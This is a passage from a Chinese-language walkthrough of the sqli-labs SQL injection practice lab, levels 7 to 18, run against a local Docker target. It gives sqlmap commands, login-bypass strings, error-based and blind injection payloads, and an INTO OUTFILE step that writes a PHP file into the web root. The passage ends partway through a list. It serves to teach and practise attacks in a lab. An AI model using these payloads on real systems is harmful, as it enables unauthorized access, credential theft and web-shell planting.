<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure>
<p>sqlmap 的 Payload 如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&apos;QUpy&apos;=&apos;QUpy</span><br></pre></td></tr></table></figure>
<h4 id="导出数据到文件"><a href="#导出数据到文件" class="headerlink" title="导出数据到文件"></a>导出数据到文件</h4><p>因为这一关作者很明显地提示了如下信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>
<p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下，这个 Docker 靶机理论上应该是开启的，进入容器验证一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysql -e "show global variables like '%secure%';"</span></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
<ul>
<li>ure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li>
<li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li>
</ul>
<p>下面开始直接将数据库里面的信息导出到文件中吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+</span><br></pre></td></tr></table></figure>
<p>因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/mysql/security</span><br></pre></td></tr></table></figure>
<p>查看下是否将数据库信息导出到文件中了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/lib/mysql/security/users.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure>
<p>但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。</p>
<p>所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&apos;))+UNION+SELECT * from security.users INTO OUTFILE &quot;/var/www/html/Less-7/users.txt&quot;--+</span><br></pre></td></tr></table></figure>
<p>这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息：</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntaxCan't create/write to file</span><br></pre></td></tr></table></figure>
<p>这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>
<p>然后再执行上面的语句应该是可以成功的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:8888/Less-7/users.txt</span><br><span class="line">1    Dumb    Dumb</span><br><span class="line">2    Angelina    I-kill-you</span><br><span class="line">3    Dummy    p@ssword</span><br><span class="line">4    secure    crappy</span><br><span class="line">5    stupid    stupidity</span><br><span class="line">6    superman    genious</span><br><span class="line">7    batman    mob!le</span><br><span class="line">8    admin    admin</span><br><span class="line">9    admin1    admin1</span><br><span class="line">10    admin2    admin2</span><br><span class="line">11    admin3    admin3</span><br><span class="line">12    dhakkan    dumbo</span><br><span class="line">14    admin4    admin4</span><br></pre></td></tr></table></figure>
<p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1'))+UNION+<span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">"&lt;?php phpinfo();?&gt;"</span> <span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">"/var/www/html/Less-7/info.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>访问对应的 URL 看看是否解析了呢：</p>
<p><img src="http://qiniuyun.lintstar.top/15893696834265.png" alt="15893696834265"></p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>布尔盲注、延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。</p>
<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>延时盲注</td>
<td><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody>
</table>
<p>和 Less-7 注入方式一致，只是拼接方式不一样，这里国光就不再啰嗦了。</p>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用单引号拼接</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure>
<p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入。延时注入细节可以参考 Less-1 的注入细节。</p>
<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先使用双引号再直接拼接</span></span><br><span class="line">$id = <span class="string">'"'</span>.$id.<span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持延时盲注</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出 You are in............</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    输出 You are in...........</span><br></pre></td></tr></table></figure>
<p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p>
<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=&#39;x&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>源码简单分析</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST 方式接受变量</span></span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号拼接 SQL</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    输出查询的信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p>
<h4 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h4><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'admin'</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  8 | admin    | admin    |</span><br><span class="line">+----+----------+----------+</span><br></pre></td></tr></table></figure>
<p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注释掉 passwd 来登录</span></span><br><span class="line">uname=admin<span class="string">'--+&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin'</span><span class="comment">#&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注释后面语句 并 添加一个永真条件</span></span><br><span class="line">uname=admin&amp;passwd=1<span class="string">' or 1--+&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1'</span>||1--+&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=1<span class="string">' or 1#&amp;submit=Submit</span></span><br><span class="line"><span class="string">uname=admin&amp;passwd=1'</span>||1<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 闭合后面语句 并 添加一个永真条件</span></span><br><span class="line">uname=admin&amp;passwd=1<span class="string">'or'</span>1<span class="string">'='</span>1&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=1<span class="string">'||'</span>1<span class="string">'='</span>1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p>因为这是一个 POST 型的注入，那么国光这里就再啰嗦一遍，走一遍详细的流程吧</p>
<h4 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><blockquote>
<p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<h4 id="报错注入1-1"><a href="#报错注入1-1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<h4 id="报错注入2-1"><a href="#报错注入2-1" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&apos; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1=1#&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>数据库第一个字母为 <code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and left(database(),1)&gt;&apos;r&apos;#&amp;passwd=&amp;submit=Submit</span><br><span class="line">uname=admin&apos; and left(database(),1)&gt;&apos;s&apos;#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<h4 id="延时盲注-1"><a href="#延时盲注-1" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd=&amp;submit=Submit</span><br><span class="line">uname=admin&apos; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd=&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<h4 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h4><p><strong>加载目标</strong></p>
<p>可以直接将 Burpsuite 截取的数据包内容保持为文本格式 <code>test.txt</code>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Less-11/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8888</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1:8888/Less-11/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 38</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=2333&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p>然后直接使用 sqlmap 的 -r 参数来加载这个请求包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r test.txt</span><br></pre></td></tr></table></figure>
<p>也可以手动通过 <code>--data</code> 来对 POST 的数据包内容进行注入检测：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span></span><br></pre></td></tr></table></figure>
<p>实际上 <code>--data</code> 比较鸡肋，操作效率比较低，因为比较冷门，所有适合来炫耀自己会这个参数，这样对 sqlmap 不够了解的人 就会觉得很高大上。所以接下来国光我都使用 <code>--data</code> 这个参数来进行注入 🤓</p>
<p><strong>联合查询注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure>
<p><strong>报错注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<p><strong>布尔盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure>
<p><strong>延时盲注</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://127.0.0.1:8888/Less-11/"</span> --data=<span class="string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="string">"uname"</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure>
<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>username=(&quot;x&quot;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p>
<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>username=(&#39;x&#39;)</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST 方式接受变量</span></span><br><span class="line">$uname=$_POST[<span class="string">'uname'</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用单引号和括号来拼接 SQL</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">true</span>:</span><br><span class="line">    并没有输出啥信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p>
<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>username=&quot;x&quot;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先使用 双引号 再直接带入 SQL 语句</span></span><br><span class="line">$uname=<span class="string">'"'</span>.$uname.<span class="string">'"'</span>;</span><br><span class="line">$passwd=<span class="string">'"'</span>.$passwd.<span class="string">'"'</span>;</span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
<p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p>
<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>布尔盲注、延时盲注</td>
<td><code>username=&#39;x&#39;</code></td>
</tr>
</tbody>
</table>
<p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p>
<p>国光这里不再做重复无意义的记录了。</p>
<h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>布尔盲注、延时盲注</td>
<td><code>username=(&quot;x&quot;)</code></td>
</tr>
</tbody>
</table>
<p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p>
<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>password = &#39;$passwd&#39;</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uname 参数被过滤了</span></span><br><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span></span><br><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select 结果正确:</span><br><span class="line">    <span class="comment"># 更新语句 使用单引号拼接 passwd</span></span><br><span class="line">    $update=<span class="string">"UPDATE users SET password = '$passwd' WHERE username='$row1'"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mysql 报错:</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1<span class="string">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>POST</td>
<td>报错、布尔盲注、延时盲注</td>
<td><code>VALUES (&#39;$uagent&#39;)</code></td>
</tr>
</tbody>
</table>
<p><strong>简单源码分析</strong>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取请求的 uagent 和 ip 地址</span></span><br><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 输入了uname 和 passwd:</span><br><span class="line">    <span class="comment"># 对这两个参数进行过滤</span></span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> SQL语句有返回结果:</span><br><span class="line">        <span class="comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span></span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">            输出 $uagent;</span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print_r(mysql_error());</span><br></pre></td></tr></table></figure>
<p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p>
<p><strong>PHP 里用来获取客户端 IP 的变量</strong></p>
<ul>
<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li>
